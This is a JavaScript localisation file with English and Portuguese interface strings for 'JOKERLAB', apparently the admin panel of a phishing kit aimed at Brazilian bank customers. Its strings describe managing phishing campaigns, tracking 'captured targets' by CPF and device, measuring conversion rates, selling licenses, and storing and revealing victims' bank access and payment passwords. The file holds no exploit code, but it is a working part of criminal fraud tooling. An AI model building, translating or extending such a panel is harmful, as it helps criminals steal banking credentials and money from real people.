import i18n from "i18next";
import { initReactI18next } from "react-i18next";
import LanguageDetector from "i18next-browser-languagedetector";

const resources = {
  en: {
    translation: {
      // Common
      "common.login": "Login",
      "common.logout": "Logout",
      "common.email": "Email",
      "common.password": "Password",
      "common.save": "Save",
      "common.cancel": "Cancel",
      "common.delete": "Delete",
      "common.edit": "Edit",
      "common.view": "View",
      "common.actions": "Actions",
      "common.status": "Status",
      "common.active": "Active",
      "common.inactive": "Inactive",
      "common.suspended": "Suspended",
      "common.pending": "Pending",
      "common.approved": "Approved",
      "common.rejected": "Rejected",
      "common.loading": "Loading...",
      "common.name": "Name",
      "common.phone": "Phone",
      "common.date": "Date",
      "common.error": "Error",
      "common.actions": "Actions",

      // Auth
      "auth.title": "JOKERLAB",
      "auth.subtitle": "Administrative Panel",
      "auth.loginPlaceholder": "admin@jokerlab.app",
      "auth.passwordPlaceholder": "••••••••",
      "auth.loginButton": "Login",
      "auth.loggingIn": "Logging in...",
      "auth.loginSuccess": "Login successful",
      "auth.loginSuccessDesc": "Welcome to the admin panel",
      "auth.loginError": "Login error",
      "auth.invalidCredentials": "Invalid credentials",

      // Sidebar
      "sidebar.mainMenu": "MAIN MENU",
      "sidebar.dashboard": "Dashboard",
      "sidebar.users": "Users",
      "sidebar.targets": "Target Center",
      "sidebar.banks": "Banks",
      "sidebar.verification": "Verification",
      "sidebar.ultimatePanel": "Ultimate Panel",

      // Dashboard
      "dashboard.title": "Dashboard",
      "dashboard.description": "Manage your phishing campaigns with total control",
      "dashboard.targetsCapture": "Captured Targets",
      "dashboard.uniqueVisitors": "Unique Visitors",
      "dashboard.activeLicenses": "Active Licenses",
      "dashboard.conversionRate": "Conversion Rate",
      "dashboard.thisMonth": "+12% this month",
      "dashboard.last24h": "Last 24h",
      "dashboard.checkers": "0 Checkers",
      "dashboard.performance": "↗ Performance",
      "dashboard.activePage": "Active Page",
      "dashboard.copy": "Copy",
      "dashboard.totalBanks": "Total Banks:",
      "dashboard.availableBanks": "Available Banks",

      // Users
      "users.title": "User Management",
      "users.description": "View and manage all system users",
      "users.addUser": "Add User",
      "users.exportData": "Export Data",
      "users.photo": "Photo",
      "users.username": "Username",
      "users.bank": "Bank",
      "users.ipAddress": "IP Address",
      "users.memberSince": "Member Since",
      "users.editUser": "Edit User",
      "users.deleteUser": "Delete User",
      "users.confirmDelete": "Are you sure you want to delete this user?",
      "users.noUsers": "No users found",
      "users.userDeleted": "User deleted",
      "users.userDeletedSuccess": "User deleted successfully",
      "users.deleteError": "Could not delete user",

      // Targets
      "targets.cpf": "CPF",
      "targets.bank": "Bank",
      "targets.bankDetails": "Bank Details",

      // Banks
      "banks.bankName": "Bank Name",
      "banks.accessPassword": "Access Password",
      "banks.paymentPassword": "Payment Password",
      "banks.bankDeleted": "Bank deleted",
      "banks.bankDeletedSuccess": "Bank deleted successfully",
      "banks.deleteError": "Could not delete bank",

      // Verification
      "verification.photo": "Photo",
      "verification.statusUpdated": "Status updated",
      "verification.statusUpdatedSuccess": "Verification status updated successfully",
      "verification.updateError": "Could not update status",

      // User Profile
      "userProfile.title": "User Profile",
      "userProfile.description": "Manage your personal information with total control and advanced security",
      "userProfile.accountSettings": "Account Settings",
      "userProfile.personalInfo": "Personal Information",
      "userProfile.user": "User",
      "userProfile.usernamePlaceholder": "Username",
      "userProfile.emailPlaceholder": "User email",
      "userProfile.memberSinceDefault": "January 2024",
      "userProfile.statusDescription": "Status Description",
      "userProfile.unknownStatus": "Unknown status: undefined",
      "userProfile.nameCannotChange": "The username cannot be changed",
      "userProfile.contactSupport": "Contact support to change email",
      "userProfile.phonePlaceholder": "(11) 99999-9999",

      // Targets
      "targets.title": "Target Center",
      "targets.description": "Manage and monitor your targets with maximum efficiency",
      "targets.totalTargets": "Total Targets",
      "targets.mobileTargets": "Mobile Targets",
      "targets.desktopTargets": "Desktop Targets",
      "targets.withBankData": "With Bank Data",
      "targets.captureTime": "Capture Time",
      "targets.cpf": "CPF",
      "targets.bankDetails": "Bank Details",
      "targets.device": "Device",
      "targets.viewDetails": "View Details",
      "targets.noTargets": "No targets found. Wait for new targets to be captured",

      // Banks
      "banks.title": "Banking Information",
      "banks.description": "Manage banking credentials with security",
      "banks.addBank": "Add Bank",
      "banks.accessPassword": "Access Password",
      "banks.paymentPassword": "Payment Password",
      "banks.showPassword": "Show Password",
      "banks.hidePassword": "Hide Password",
      "banks.editBank": "Edit Bank",
      "banks.deleteBank": "Delete Bank",
      "banks.confirmDeleteBank": "Are you sure you want to delete this bank?",
      "banks.noBanks": "No banks found",

      // Verification
      "verification.title": "Verification System",
      "verification.description": "Approve or reject user verifications",
      "verification.user": "User",
      "verification.type": "Type",
      "verification.document": "Document",
      "verification.approve": "Approve",
      "verification.reject": "Reject",
      "verification.approved": "Approved",
      "verification.rejected": "Rejected",
      "verification.noVerifications": "No verifications found",
    }
  },
  pt: {
    translation: {
      // Common
      "common.login": "Entrar",
      "common.logout": "Sair",
      "common.email": "Email",
      "common.password": "Senha",
      "common.save": "Salvar",
      "common.cancel": "Cancelar",
      "common.delete": "Excluir",
      "common.edit": "Editar",
      "common.view": "Visualizar",
      "common.actions": "Ações",
      "common.status": "Status",
      "common.active": "Ativo",
      "common.inactive": "Inativo",
      "common.suspended": "Suspenso",
      "common.pending": "Pendente",
      "common.approved": "Aprovado",
      "common.rejected": "Rejeitado",
      "common.loading": "Carregando...",
      "common.name": "Nome",
      "common.phone": "Telefone",
      "common.date": "Data",
      "common.error": "Erro",
      "common.actions": "Ações",

      // Auth
      "auth.title": "JOKERLAB",
      "auth.subtitle": "Painel Administrativo",
      "auth.loginPlaceholder": "admin@jokerlab.app",
      "auth.passwordPlaceholder": "••••••••",
      "auth.loginButton": "Entrar",
      "auth.loggingIn": "Entrando...",
      "auth.loginSuccess": "Login realizado com sucesso",
      "auth.loginSuccessDesc": "Bem-vindo ao painel administrativo",
      "auth.loginError": "Erro no login",
      "auth.invalidCredentials": "Credenciais inválidas",

      // Sidebar
      "sidebar.mainMenu": "MENU PRINCIPAL",
      "sidebar.dashboard": "Dashboard",
      "sidebar.users": "Usuários",
      "sidebar.targets": "Central de Targets",
      "sidebar.banks": "Bancos",
      "sidebar.verification": "Verificação",
      "sidebar.ultimatePanel": "Ultimate Panel",

      // Dashboard
      "dashboard.title": "Dashboard",
      "dashboard.description": "Gerencie suas campanhas de phishing com controle total",
      "dashboard.targetsCapture": "Targets Capturados",
      "dashboard.uniqueVisitors": "Visitantes Únicos",
      "dashboard.activeLicenses": "Licenças Ativas",
      "dashboard.conversionRate": "Taxa de Conversão",
      "dashboard.thisMonth": "+12% este mês",
      "dashboard.last24h": "Últimas 24h",
      "dashboard.checkers": "0 Checkers",
      "dashboard.performance": "↗ Performance",
      "dashboard.activePage": "Página Ativa",
      "dashboard.copy": "Copiar",
      "dashboard.totalBanks": "Total de Bancos:",
      "dashboard.availableBanks": "Bancos Disponíveis",

      // Users
      "users.title": "Gerenciamento de Usuários",
      "users.description": "Visualize e gerencie todos os usuários do sistema",
      "users.addUser": "Adicionar Usuário",
      "users.exportData": "Exportar Dados",
      "users.photo": "Foto",
      "users.username": "Nome",
      "users.bank": "Banco",
      "users.ipAddress": "Endereço IP",
      "users.memberSince": "Membro desde",
      "users.editUser": "Editar Usuário",
      "users.deleteUser": "Excluir Usuário",
      "users.confirmDelete": "Tem certeza que deseja excluir este usuário?",
      "users.noUsers": "Nenhum usuário encontrado",
      "users.userDeleted": "Usuário excluído",
      "users.userDeletedSuccess": "O usuário foi excluído com sucesso",
      "users.deleteError": "Não foi possível excluir o usuário",

      // Targets
      "targets.cpf": "CPF",
      "targets.bank": "Banco",
      "targets.bankDetails": "Detalhes Bancários",

      // Banks
      "banks.bankName": "Nome do Banco",
      "banks.accessPassword": "Senha de Acesso",
      "banks.paymentPassword": "Senha de Pagamento",
      "banks.bankDeleted": "Banco excluído",
      "banks.bankDeletedSuccess": "O banco foi excluído com sucesso",
      "banks.deleteError": "Não foi possível excluir o banco",

      // Verification
      "verification.photo": "Foto",
      "verification.statusUpdated": "Status atualizado",
      "verification.statusUpdatedSuccess": "O status da verificação foi atualizado com sucesso",
      "verification.updateError": "Não foi possível atualizar o status",

      // User Profile
      "userProfile.title": "Perfil do Usuário",
      "userProfile.description": "Gerencie suas informações pessoais com controle total e segurança avançada",
      "userProfile.accountSettings": "Configurações da Conta",
      "userProfile.personalInfo": "Informações Pessoais",
      "userProfile.user": "Usuário",
      "userProfile.usernamePlaceholder": "Nome de usuário",
      "userProfile.emailPlaceholder": "Email do usuário",
      "userProfile.memberSinceDefault": "Janeiro 2024",
      "userProfile.statusDescription": "Descrição do Status",
      "userProfile.unknownStatus": "Status desconhecido: undefined",
      "userProfile.nameCannotChange": "O nome do usuário não pode ser alterado",
      "userProfile.contactSupport": "Este em contato com o suporte para alterar o email",
      "userProfile.phonePlaceholder": "(11) 99999-9999",

      // Targets
      "targets.title": "Central de Targets",
      "targets.description": "Gerencie e monitore seus targets com máxima eficiência",
      "targets.totalTargets": "Total de Targets",
      "targets.mobileTargets": "Targets Mobile",
      "targets.desktopTargets": "Targets Desktop",
      "targets.withBankData": "Com Dados Bancários",
      "targets.captureTime": "Horário de Captura",
      "targets.cpf": "CPF",
      "targets.bankDetails": "Detalhes Bancários",
      "targets.device": "Dispositivo",
      "targets.viewDetails": "Ver Detalhes",
      "targets.noTargets": "Nenhum target encontrado. Aguarde novos targets serem capturados",

      // Banks
      "banks.title": "Informações Bancárias",
      "banks.description": "Gerencie as credenciais bancárias com segurança",
      "banks.addBank": "Adicionar Banco",
      "banks.accessPassword": "Senha de Acesso",
      "banks.paymentPassword": "Senha de Pagamento",
      "banks.showPassword": "Mostrar Senha",
      "banks.hidePassword": "Ocultar Senha",
      "banks.editBank": "Editar Banco",
      "banks.deleteBank": "Excluir Banco",
      "banks.confirmDeleteBank": "Tem certeza que deseja excluir este banco?",
      "banks.noBanks": "Nenhum banco encontrado",

      // Verification
      "verification.title": "Sistema de Verificação",
      "verification.description": "Aprove ou rejeite verificações de usuários",
      "verification.user": "Usuário",
      "verification.type": "Tipo",
      "verification.document": "Documento",
      "verification.approve": "Aprovar",
      "verification.reject": "Rejeitar",
      "verification.approved": "Aprovado",
      "verification.rejected": "Rejeitado",
      "verification.noVerifications": "Nenhuma verificação encontrada",
    }
  }
};

i18n
  .use(LanguageDetector)
  .use(initReactI18next)
  .init({
    resources,
    fallbackLng: "pt",
    debug: false,
    interpolation: {
      escapeValue: false,
    },
    detection: {
      order: ['localStorage', 'navigator', 'htmlTag'],
      caches: ['localStorage'],
    },
  });

export default i18n;